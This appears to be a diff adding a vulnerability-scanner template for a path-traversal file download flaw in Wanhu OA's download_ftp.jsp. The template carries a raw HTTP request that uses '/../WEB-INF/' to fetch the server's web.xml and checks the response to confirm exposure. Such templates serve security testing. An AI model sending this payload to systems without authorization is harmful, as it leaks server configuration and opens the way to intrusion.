@@ -1,0 +1,28 @@
+id: WanhuOA_download_ftp_filedownload
+info:
+  name: 万户OA download_ftp.jsp 任意文件下载漏洞
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
+  tags: WanhuOA,filedownload
+requests:
+  - raw:
+      - |+
+        GET /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <web-app>
+      - type: word
+        part: header
+        words:
+          - '200'
